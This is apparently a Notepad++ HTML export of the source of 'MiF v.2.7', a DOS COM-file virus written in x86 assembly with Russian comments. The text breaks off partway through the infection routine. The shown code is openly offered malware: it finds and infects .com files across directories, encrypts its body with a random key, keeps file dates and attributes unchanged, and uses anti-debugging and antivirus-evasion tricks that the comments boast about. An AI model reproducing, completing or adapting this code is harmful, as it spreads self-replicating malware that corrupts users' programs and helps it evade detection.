<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;            ▄█▄</span><span class="sc0">
</span><span class="sc1">;           ▄███▐  ▐███▀  ▄███▄▄  ■ Let's add some infection to this ■</span><span class="sc0">
</span><span class="sc1">;          ▄███▐▌   ██▌ ▐██▀   ▀▌            fuckin' world</span><span class="sc0">
</span><span class="sc1">;         ▄█▓▓ █▌   ██▒ ██▓          ────────-─────-────-───-──-─--· ·  ·</span><span class="sc0">
</span><span class="sc1">; ███    ▄█▓▒ ██████▓▒▒ █▓▒</span><span class="sc0">
</span><span class="sc1">; ▀███  ▄█▓▒  ▐██▌  ▐▓▒ ▐█▒          [ MiF ] v.2.7 BugFix (cl) by SST</span><span class="sc0">
</span><span class="sc1">;  ▀███▄▓▒▒   ▐██   ▐█▓  ▐██▄  ▄█▌</span><span class="sc0">
</span><span class="sc1">;   ▀████▓    ███▄  ███▄  ▀█████▀</span><span class="sc0">

</span><span class="sc1">; Простенький шифрованный (with random key) нерезедентный вирус</span><span class="sc0">
</span><span class="sc1">; для DOS. Инфицирует *.com (метод dot-dot), записывая в начало</span><span class="sc0">
</span><span class="sc1">; жертвы jmp на себя, а себя - в конец.. жертвы ;) Использует</span><span class="sc0">
</span><span class="sc1">; следующие методы маскировки: не меняет атрибутов, времени и</span><span class="sc0">
</span><span class="sc1">; даты создания (последней модификации) файлов, ставит 'затычку'</span><span class="sc0">
</span><span class="sc1">; на int 24h.</span><span class="sc0">

</span><span class="sc1">; Вирус для очень начинающих (без всяких прибамбасов и с горами лишних байт)</span><span class="sc0">

</span><span class="sc1">;  ·------------------- Source Of MiF Virus v.2.7 -------------------·</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">                     </span><span class="sc1">; для создания файлов com-формата</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">                            </span><span class="sc1">; используем инструкции 286 процессора</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                           </span><span class="sc1">; указываем на то, что начались данные</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                                
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">      </span><span class="sc1">; джамп (jmp) на наш вирус + NOP для</span><span class="sc0">
                                </span><span class="sc1">; проверки на зараженность</span><span class="sc0">
</span><span class="sc5">real_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">; Сохраняем содержимое регистров</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; AntiDebuger</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0004</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">antiheur</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">               </span><span class="sc1">; берем из порта таймера случайный байт,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; заносим в ah, еще раз и результат в al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">               </span><span class="sc1">; сравниваем al и al, если равно, то</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; идем дальше, не равно? тогда снова на</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">antiheur</span><span class="sc0">            </span><span class="sc1">; метку 'antiheur'. эмуляторы не могут подобрать</span><span class="sc0">
                                </span><span class="sc1">; нужные байты (лень им возиться!) и гордо</span><span class="sc0">
                                </span><span class="sc1">; пишут 'Ok' ;) (Не все av на это покупаются ;(</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">del_ofs</span><span class="sc0">            </span><span class="sc1">; получить delta offset</span><span class="sc0">
</span><span class="sc5">del_ofs</span><span class="sc4">:</span><span class="sc0">                        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">del_ofs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">              </span><span class="sc1">; вызываем процедуру расшифровки</span><span class="sc0">
                                </span><span class="sc1">; нашего виря</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_step</span><span class="sc0">           </span><span class="sc1">; перепрыгиваем процедуры сразу</span><span class="sc0">
                                </span><span class="sc1">; на расшифрованный код виря</span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">next_step</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">end_vir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">next_step</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; длина шифруемого кода вируса</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; в dx ключ для шифровки</span><span class="sc0">
</span><span class="sc5">again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; шифруем поWORDно</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc5">number1</span><span class="sc0">            </span><span class="sc1">; через сопроцессор</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc5">number2</span><span class="sc0">
        </span><span class="sc7">fadd</span><span class="sc0">
        </span><span class="sc7">fistp</span><span class="sc0"> </span><span class="sc5">oki</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">oki</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">again</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc5">number1</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">number2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">oki</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc5">crypt_key</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; ключ для шифровки вируса</span><span class="sc0">

</span><span class="sc5">crypt_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">              </span><span class="sc1">; зашифровали</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">real_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; записали зашифрованный</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">len</span><span class="sc0">              </span><span class="sc1">; кусок в файл</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">              </span><span class="sc1">; расшифровали</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">next_step</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">after_proc</span><span class="sc0">          </span><span class="sc1">; перепрыгиваем процедуры</span><span class="sc0">

</span><span class="sc5">int24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">set_lseek</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">                    </span><span class="sc1">; одно и то же, что и xor dx,dx,</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                </span><span class="sc1">; но только если ax &lt;= 8000h !</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">after_proc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">           </span><span class="sc1">; немножко подправим int 24h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">int24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">             </span><span class="sc1">; сохраняем путь ДОСа</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">              </span><span class="sc1">; текущий диск</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">path_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">             </span><span class="sc1">; устанавливаем DTA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">orig_bytes</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; сохраняем первые четыре байта проги</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">start2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filespec</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">               </span><span class="sc1">; все атрибуты</span><span class="sc0">

</span><span class="sc5">file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">             </span><span class="sc1">; файл найден - инфицируем его</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">prev</span><span class="sc0">               </span><span class="sc1">; нет? ищем в предыдущем каталоге</span><span class="sc0">

</span><span class="sc5">prev</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">             </span><span class="sc1">; перейти в предыдущий каталог</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">pdir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">start2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">attribs</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">     </span><span class="sc1">; сохранить атрибуты</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; убрать все атрибуты</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Порой сам удивляешься, как же легко обмануть антивирусы ;)</span><span class="sc0">
</span><span class="sc1">; Без всяких навороченных приемов, просто очищаем регистр ax,</span><span class="sc0">
</span><span class="sc1">; заносим в ah=3dh (функция открытия файла для ЧТЕНИЯ и только),</span><span class="sc0">
</span><span class="sc1">; а потом подбираем из порта таймера (как он полезен!) 02h в</span><span class="sc0">
</span><span class="sc1">; регистр al. В ax получаем 3d02h, но видно трудно подобрать</span><span class="sc0">
</span><span class="sc1">; резидентным антивирусным мониторам и прочей нечести ;) так</span><span class="sc0">
</span><span class="sc1">; необходимое 02h в al и 'чудо-програмки' никак не реагируют</span><span class="sc0">
</span><span class="sc1">; на запуск виря, ведь по их 'мнению' мы просто открываем файл</span><span class="sc0">
</span><span class="sc1">; для ЧТЕНИЯ, не более =&gt; 8-)  (не работает на NOD32 :(</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; очистить регистр ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">              </span><span class="sc1">; открыть файл для чтения (и все!)</span><span class="sc0">

</span><span class="sc5">obman</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">               </span><span class="sc1">; подборка 02h для регистра al из</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">              </span><span class="sc1">; порта таймера</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">obman</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; в dx - имя найденого файла</span><span class="sc0">
                                </span><span class="sc1">; берется из DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">all_ok</span><span class="sc0">              </span><span class="sc1">; нет ошибок? тогда на 'all_ok'</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_next</span><span class="sc0">           </span><span class="sc1">; ошибки? ищем следующий</span><span class="sc0">

</span><span class="sc1">; Ну а дальше все как по маслу :))</span><span class="sc0">

</span><span class="sc5">all_ok</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; хэндл найденого файла</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">              </span><span class="sc1">; прочитать первые три байта</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">orig_bytes</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                </span><span class="sc1">; есть ошибки? тогда - следующей</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">orig_bytes</span><span class="sc4">],</span><span class="sc2">0E990h</span><span class="sc0">
</span><span class="sc1">;//  Только на NOP не рекомендую проверять - такое тоже встречается..</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">orig_bytes</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc1">; это EXE (MZ) переименованный в com?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                </span><span class="sc1">; да? - на close</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">orig_bytes</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">; EXE (ZM)?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                </span><span class="sc1">; да? - на close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_lseek</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">end_vir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">  </span><span class="sc1">; файл равен размеру виря?</span><span class="sc0">
        </span><span class="sc6">jna</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">               </span><span class="sc1">; да? - на close</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">65000d</span><span class="sc0">           </span><span class="sc1">; файл =&gt; 65000 байт?</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">               </span><span class="sc1">; да? - на close</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">               </span><span class="sc1">; опять же из порта таймера</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; берем случайные числа ;)</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; сохраняем ключ (ax) в 'crypt_key'</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">            </span><span class="sc1">; сохраняем время и дату последней</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; модификации файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_lseek</span><span class="sc0">          </span><span class="sc1">; в конец вируса</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; размер файла</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">; минус три байта (для jmp'а)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">first_bytes</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt_virus</span><span class="sc0">        </span><span class="sc1">; запишем в конец файла</span><span class="sc0">
                                </span><span class="sc1">; зашифрованный вирь</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                </span><span class="sc1">; есть ошибки? тогда - следующий</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; al=00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_lseek</span><span class="sc0">          </span><span class="sc1">; в начало файла</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; пишем jmp на вирь в начало файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">first_bytes</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
